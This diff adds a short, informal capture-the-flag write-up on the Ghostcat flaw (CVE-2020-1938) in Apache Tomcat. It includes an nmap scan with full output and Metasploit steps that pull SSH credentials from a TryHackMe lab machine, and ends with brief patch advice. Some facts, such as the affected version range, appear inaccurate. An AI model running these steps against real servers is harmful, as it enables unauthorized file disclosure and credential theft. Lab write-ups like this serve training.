@@ -1,0 +1,71 @@
+#  HI ALL
+## IN MY ARTICALE FOR THE FIRST 48H FROM THE HACKING NEWS B'DARIJA EVENT 
+
+
+
+> ###  in this small article/write up i wanna talk about tomcat CVE-2020-1938 her impact and how to exploit them whit an example of a tryhackme room (tomghost) and why this vulnerability exist and how to patched him
+
+1.  what is cve
+* after hacking or knowing what is the first cve we need to understand what is a **CVE**
+
+* so a ***CVE*** is a short for (Commonn Vulnerabilities and Exposures) , and is a list of publicly disclosed computer security flaws and any cve has a id like **CVE-XXXX-XXXX**
+* How many CVEs are there?
+good question, the total number of cve now is 191637
+
+2 - now go back to our main subject the tomcat CVE-2020-1938
+> 2.1 explain
+*  The Apache Ghostcat vulnerability is an LFI (Local File Inclusion) vulnerability Ghost Cat is a vulnerability that affects Apache Tomcat. It currently affects versions before 9.0.3, It is caused by an inseucre configuration of the AJP protocol in the default installation of Tomcat, leading to attackers being able to cause information disclosure, and potentially remote code execution.
+-what is AJP protocole
+AJP stands for Apache Jserv Protocol, and it is used as an optimized version of the HTTP AJP protocol is used for communication between Tomcat and Apache, the software modules used on Apache
+> 2.2 What Ghostcat vulnerability can do what is here impact :
+- As we have discussed till now that Ghostcat is a file inclusion vulnerability and It’s not a Remote Code Execution (RCE) by default. But some circumstances made it RCE.
+-will allow an attacker to read any resources that exist on the Tomcat server 
+>2.3 and now is the time to learn how to exloit this vulnerability 
+* there is a lot of exploits for this cve but now we will use **metasploit** and the tryhackme room of tomghost
+* so let's do nmap scan first
+```
+nmap -sC -sV 10.10.10.10
+Nmap scan report for 10.10.16.253
+Host is up, received user-set (0.15s latency).
+Scanned at 2022-03-13 15:15:29 IST for 32s
+Not shown: 996 closed ports
+Reason: 996 conn-refused
+PORT     STATE SERVICE    REASON  VERSION
+22/tcp   open  ssh        syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQvC8xe2qKLoPG3vaJagEW2eW4juBu9nJvn53nRjyw7y/0GEWIxE1KqcPXZiL+RKfkKA7RJNTXN2W9kCG8i6JdVWs2x9wD28UtwYxcyo6M9dQ7i2mXlJpTHtSncOoufSA45eqWT4GY+iEaBekWhnxWM+TrFOMNS5bpmUXrjuBR2JtN9a9cqHQ2zGdSlN+jLYi2Z5C7IVqxYb9yw5RBV5+bX7J4dvHNIs3otGDeGJ8oXVhd+aELUN8/C2p5bVqpGk04KI2gGEyU611v3eOzoP6obem9vsk7Kkgsw7eRNt1+CBrwWldPr8hy6nhA6Oi5qmJgK1x+fCmsfLSH3sz1z4Ln
+|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOscw5angd6i9vsr7MfCAugRPvtx/aLjNzjAvoFEkwKeO53N01Dn17eJxrbIWEj33sp8nzx1Lillg/XM+Lk69CQ=
+|   256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGqgzoXzgz5QIhEWm3+Mysrwk89YW2cd2Nmad+PrE4jw
+53/tcp   open  tcpwrapped syn-ack
+8009/tcp open  ajp13      syn-ack Apache Jserv (Protocol v1.3)
+| ajp-methods: 
+|_  Supported methods: GET HEAD POST OPTIONS
+8080/tcp open  http       syn-ack Apache Tomcat 9.0.30
+|_http-favicon: Apache Tomcat
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Apache Tomcat/9.0.30
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/
+```
+*  after small recon we found  Apache Tomcat 9.0.30
+*  so let's use metasploit and run our exploit :
+  ```
+msfconsole
+msf6 > search apache tomcat 9
+0 auxiliary/admin:http/tomcat_ghostcat
+use 0
+msf > show options
+msf>set rhost (ip)
+msf>run
+
+  ```
+after running the exploit we get ssh credantials so the exploit is working and the machine is vulnerable
+> 2.4 patching the vulnerability
+* the easiest way is updating apatche tompcat 
